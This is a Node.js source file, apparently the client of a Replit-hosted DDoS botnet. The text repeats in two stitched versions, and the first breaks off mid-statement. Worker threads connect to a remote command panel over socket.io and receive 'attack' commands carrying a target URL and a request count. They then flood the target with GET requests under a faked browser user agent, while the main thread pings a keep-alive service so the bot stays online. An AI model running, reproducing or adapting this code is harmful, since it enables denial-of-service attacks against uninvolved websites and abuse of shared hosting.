const {
  Worker,
  isMainThread
} = require('worker_threads');
const io = require("socket.io-client");
const randomUA = require('random-fake-useragent')

if (isMainThread) {
  for (i = 0; i < require('os').cpus().length / 1.5; i++) {
    new Worker(__filename);
  }
  const axios = require('axios');

  const express = require('express')
  const app = express()
  app.get("/", (req, res) => {
    res.end('e')
  })
  app.listen(80, () => {
    axios.get('https://pinger-hub.1nchpp.repl.co/ping?url=https://' + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
  })
} else {
  console.log('starting thread')
  const axios = require('axios');
  var url = ''
  var stop = false
  const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
    reconnection: true,
    reconnectionAttempts: 10000,
const { Worker, isMainThread } = require('worker_threads');
const io = require('socket.io-client');
const randomUA = require('random-fake-useragent');

if (isMainThread) {
	for (i = 0; i < require('os').cpus().length / 2.5; i++) {
		new Worker(__filename);
	}
	const axios = require('axios');

	const express = require('express');
	const app = express();
	app.get('/', (req, res) => {
		res.end('e');
	});
	app.listen(80, () => {
		axios.get('https://pinger-hub.1nchpp.repl.co/ping?url=https://' + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co").then(()=>{console.log('added')})
	});
} else {
	const UA = randomUA.getRandom('Chrome');
	const axios = require('axios')
	var url = '';
	var stop = true;
	const socket = io('wss://repfucker-panel.zsdyuqczexhehe0.repl.co', {
	//io('wss://FaithfulYellowgreenLocation.1nchpp.repl.co', {
		reconnection: true,
		reconnectionAttempts: 10000,
		reconnectionDelay: 6000,
		reconnectionDelayMax: 100000
	});

	let count = 0;

	socket.on('connect', () => {
		console.log(socket.id); // "G5p5..."
	});
	socket.on('disconnect', () => {
		console.log('disconnected');
		setTimeout(() => {
			socket.connect();
		}, 1000);
	});
	socket.on('attack', async m => {
		console.log(m);
		stop = false;
		var args = m.split('*');
		url = args[0];
		console.log(parseInt(args[1]));
		count = parseInt(args[1]);
	});
	socket.on('stop', () => {
		console.log('stopping');
		stop = true;
	});
	var e = 1;
	var f = 1;

	function start() {
		setTimeout(start, 2000);
		if (stop == true || count == 0) {
			console.log('stopped');
			return;
		}
		console.log('k');
		for (i = 0; i < count; i++) {
			axios
				.request({
					url,
					method: 'GET',
					headers: {
						'User-Agent': UA
					}
				})
				.then(r => {
					console.log('sent ' + e + ' requests to', url);
					e++;
				})
				.catch(e => {
					console.log(f, 'failed requests lol');
					f++;
				});
		}
	}

	start();
}
